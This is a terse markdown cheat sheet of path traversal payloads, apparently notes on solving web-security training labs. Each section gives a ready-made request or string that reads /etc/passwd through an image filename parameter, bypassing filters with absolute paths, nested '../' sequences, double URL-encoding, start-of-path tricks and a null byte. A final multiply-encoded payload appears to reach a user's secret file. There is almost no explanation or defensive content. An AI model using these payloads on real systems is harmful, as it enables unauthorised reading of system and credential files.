## File path traversal, traversal sequences blocked with absolute path bypass

```
/image?filename=/etc/passwd
```

## File path traversal, traversal sequences stripped non-recursively

```
/image?filename=..././..././..././etc/passwd
```

## File path traversal, traversal sequences stripped with superfluous URL-decode

```
%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```

## File path traversal, validation of start of path

```
/image?filename=/var/www/images/../../../../etc/passwd
```

## File path traversal, validation of file extension with null byte bypass

```
../../../../../../etc/passwd%00.jpg
```

## Encoded

```
/image?filename=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
```

## Use my program for path traversal bruteforce
